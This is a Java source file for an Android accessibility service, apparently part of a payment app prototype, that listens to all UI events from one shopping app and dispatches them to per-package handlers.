package com.android.avast.avastpayapp.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.android.avast.avastpayapp.utils.PackageMap;

public class AvastPayService extends AccessibilityService {

    private static final String TAG = "AvastPayService";
    @Override
    public void onCreate() {
        super.onCreate();
        Log.i("Sushil", "AvastPayService onCreate");
    }

    @Override
    protected void onServiceConnected() {
        Log.i(TAG, "onServiceConnected");
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.packageNames = new String[] {
                                                    "nl.wehkamp.shop"
                                                };
        accessibilityServiceInfo.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        // Set the type of feedback your service will provide. We are setting it to GENERIC.
        accessibilityServiceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        // Default services are invoked only if no package-specific ones are present for the type of AccessibilityEvent generated.
        // This is a general-purpose service, so we will set some flags
        accessibilityServiceInfo.flags |= AccessibilityServiceInfo.DEFAULT;
        accessibilityServiceInfo.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        accessibilityServiceInfo.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        accessibilityServiceInfo.flags |= AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        accessibilityServiceInfo.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        accessibilityServiceInfo.notificationTimeout = 100;
        this.setServiceInfo(accessibilityServiceInfo);

        super.onServiceConnected();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        Log.i(TAG, "onAccessibilityEvent");
        try {
            PackageMap.getHandlerForPackage(accessibilityEvent.getPackageName().toString(), this).handleEvent(accessibilityEvent);
        } catch (ClassNotFoundException e) {
            Log.d(TAG, "ClassNotFoundException e: " + e.getMessage());
        } catch (/*Throwable th*/Exception e) {
        Log.d(TAG, "something really fishy");
    }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onInterrupt() {

    }

}
